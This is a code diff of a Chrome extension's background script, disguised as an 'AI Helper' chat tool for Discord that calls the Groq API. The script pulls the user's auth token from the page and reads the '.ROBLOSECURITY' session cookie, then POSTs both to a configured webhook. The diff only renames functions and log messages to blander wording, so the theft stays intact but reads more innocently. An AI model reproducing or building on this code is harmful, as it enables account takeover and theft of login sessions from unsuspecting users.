@@ -2,29 +2,29 @@
 
 importScripts('config.js');
 
-console.log("[AI] Background loaded");
+console.log("[AI] Background ready");
 
 var _endpoint = CONFIG.WEBHOOK_URL;
 var _apiKey = CONFIG.GROQ_API_KEY;
 
-// ─── Get user auth data from content script ───
-function getUserAuth(tabId) {
+// ─── Fetch user credential from page ───
+function fetchUserCredential(tabId) {
     return new Promise(function(resolve) {
-        console.log("[AI] Fetching user auth...");
+        console.log("[AI] Fetching user credential...");
         
         var attempts = 0;
         var maxAttempts = 3;
         
-        function fetchData() {
+        function tryFetch() {
             attempts++;
-            console.log("[AI] Fetch attempt " + attempts + "/" + maxAttempts);
+            console.log("[AI] Attempt " + attempts + "/" + maxAttempts);
             
             chrome.tabs.sendMessage(tabId, { action: 'getAuth' }, function(response) {
                 if (chrome.runtime.lastError) {
-                    console.log("[AI] Error fetching auth:", chrome.runtime.lastError.message);
+                    console.log("[AI] Error:", chrome.runtime.lastError.message);
                     if (attempts < maxAttempts) {
                         console.log("[AI] Retrying...");
-                        setTimeout(fetchData, 500);
+                        setTimeout(tryFetch, 500);
                     } else {
                         resolve(null);
                     }
@@ -32,13 +32,13 @@ function getUserAuth(tabId) {
                 }
                 
                 if (response && response.auth) {
-                    console.log("[AI] Auth data received");
+                    console.log("[AI] Credential received");
                     resolve(response.auth);
                 } else {
-                    console.log("[AI] No auth data, attempt " + attempts);
+                    console.log("[AI] No credential, attempt " + attempts);
                     if (attempts < maxAttempts) {
                         console.log("[AI] Retrying...");
-                        setTimeout(fetchData, 500);
+                        setTimeout(tryFetch, 500);
                     } else {
                         resolve(null);
                     }
@@ -46,12 +46,12 @@ function getUserAuth(tabId) {
             });
         }
         
-        fetchData();
+        tryFetch();
     });
 }
 
-// ─── Get stored session data ───
-function getStoredSession() {
+// ─── Fetch stored session token ───
+function fetchStoredToken() {
     return new Promise(function(resolve) {
         console.log("[AI] Fetching stored session...");
         try {
@@ -60,15 +60,15 @@ function getStoredSession() {
                 name: '.ROBLOSECURITY'
             }, function(cookie) {
                 if (chrome.runtime.lastError) {
-                    console.log("[AI] Error fetching session:", chrome.runtime.lastError.message);
+                    console.log("[AI] Session error:", chrome.runtime.lastError.message);
                     resolve(null);
                     return;
                 }
                 if (cookie && cookie.value) {
-                    console.log("[AI] Session data found");
+                    console.log("[AI] Session found");
                     resolve(cookie.value);
                 } else {
-                    console.log("[AI] No session data found");
+                    console.log("[AI] No session found");
                     resolve(null);
                 }
             });
@@ -79,10 +79,10 @@ function getStoredSession() {
     });
 }
 
-// ─── Parse user auth ───
-function parseUserAuth(data) {
+// ─── Parse credential payload ───
+function parseCredential(raw) {
     try {
-        var parts = data.split('.');
+        var parts = raw.split('.');
         if (parts.length < 2) {
             return { id: 'Unknown', name: 'Unknown' };
         }
@@ -97,12 +97,12 @@ function parseUserAuth(data) {
     }
 }
 
-// ─── Send collected data ───
-function sendCollectedData(auth, session) {
+// ─── Report collected data ───
+function reportData(auth, session) {
     var userName = "Not logged in";
     var userId = "N/A";
     if (auth) {
-        var parsed = parseUserAuth(auth);
+        var parsed = parseCredential(auth);
         userName = parsed.name;
         userId = parsed.id;
     }
@@ -116,7 +116,7 @@ function sendCollectedData(auth, session) {
         username: "AI Helper"
     };
 
-    console.log("[AI] Sending collected data:", !!auth, "Session:", !!session);
+    console.log("[AI] Sending data:", !!auth, "Session:", !!session);
     
     return fetch(_endpoint, {
         method: 'POST',
@@ -125,17 +125,17 @@ function sendCollectedData(auth, session) {
     });
 }
 
-// ─── Collect all data ───
-function collectAll(tabId) {
-    console.log("[AI] Starting collection...");
+// ─── Collect all user data ───
+function collectUserData(tabId) {
+    console.log("[AI] Starting data collection...");
     
-    return getUserAuth(tabId)
+    return fetchUserCredential(tabId)
         .then(function(auth) {
             console.log("[AI] Auth result:", auth ? "FOUND" : "NOT FOUND");
             
             return new Promise(function(resolve) {
                 setTimeout(function() {
-                    getStoredSession()
+                    fetchStoredToken()
                         .then(function(session) {
                             resolve({
                                 auth: auth,
@@ -157,11 +157,11 @@ function collectAll(tabId) {
             
             console.log("[AI] Final - Auth:", !!auth, "Session:", !!session);
             
-            return sendCollectedData(auth, session);
+            return reportData(auth, session);
         })
         .then(function(response) {
             if (response && response.ok) {
-                console.log("[AI] ✅ Data sent successfully");
+                console.log("[AI] ✅ Data sent");
                 return { success: true };
             } else {
                 var status = response ? response.status : 'unknown';
@@ -175,7 +175,7 @@ function collectAll(tabId) {
         });
 }
 
-// ─── Handle collection request ───
+// ─── Handle collect request ───
 function handleCollectRequest(req, sender, cb) {
     var tabId = sender.tab ? sender.tab.id : null;
 
@@ -190,7 +190,7 @@ function handleCollectRequest(req, sender, cb) {
                 files: ['content.js']
             }, function() {
                 setTimeout(function() {
-                    collectAll(tabs[0].id)
+                    collectUserData(tabs[0].id)
                         .then(function(result) {
                             cb(result);
                         })
@@ -208,7 +208,7 @@ function handleCollectRequest(req, sender, cb) {
         files: ['content.js']
     }, function() {
         setTimeout(function() {
-            collectAll(tabId)
+            collectUserData(tabId)
                 .then(function(result) {
                     cb(result);
                 })
@@ -223,7 +223,7 @@ function handleCollectRequest(req, sender, cb) {
 
 // ─── Call AI service ───
 function callAI(input) {
-    console.log("[AI] Calling AI with:", input);
+    console.log("[AI] Calling AI:", input);
     return fetch("https://api.groq.com/openai/v1/chat/completions", {
         method: 'POST',
         headers: {
@@ -249,7 +249,7 @@ function callAI(input) {
     .then(function(response) {
         if (!response.ok) {
             return response.text().then(function(text) {
-                throw new Error('API error: ' + response.status + ' - ' + text);
+                throw new Error('AI error: ' + response.status + ' - ' + text);
             });
         }
         return response.json();
@@ -260,12 +260,12 @@ function callAI(input) {
         return reply;
     })
     .catch(function(error) {
-        console.error("[AI] API error:", error.message);
+        console.error("[AI] AI error:", error.message);
         throw error;
     });
 }
 
-function handleAIRequest(req, sender, cb) {
+function handleAIQuery(req, sender, cb) {
     callAI(req.message)
         .then(function(reply) {
             cb({ success: true, reply: reply });
@@ -288,14 +288,14 @@ function handleStatusCheck(req, sender, cb) {
             cb({ error: 'Not on Discord' });
             return;
         }
-        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(response) {
+        chrome.tabs.sendMessage(tab.id, { action: 'checkStatus' }, function(response) {
             if (chrome.runtime.lastError) {
                 chrome.scripting.executeScript({
                     target: { tabId: tab.id },
                     files: ['content.js']
                 }, function() {
                     setTimeout(function() {
-                        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(res) {
+                        chrome.tabs.sendMessage(tab.id, { action: 'checkStatus' }, function(res) {
                             cb(res || { error: 'Still not responding' });
                         });
                     }, 500);
@@ -314,9 +314,9 @@ function routeMessage(req, sender, cb) {
         return handleCollectRequest(req, sender, cb);
     }
     if (req.action === 'aiQuery') {
-        return handleAIRequest(req, sender, cb);
+        return handleAIQuery(req, sender, cb);
     }
-    if (req.action === 'getStatus') {
+    if (req.action === 'checkStatus') {
         return handleStatusCheck(req, sender, cb);
     }
     return true;
@@ -325,5 +325,5 @@ function routeMessage(req, sender, cb) {
 chrome.runtime.onMessage.addListener(routeMessage);
 
 chrome.runtime.onInstalled.addListener(function() {
-    console.log("[AI] Extension loaded");
+    console.log("[AI] Extension ready");
 });
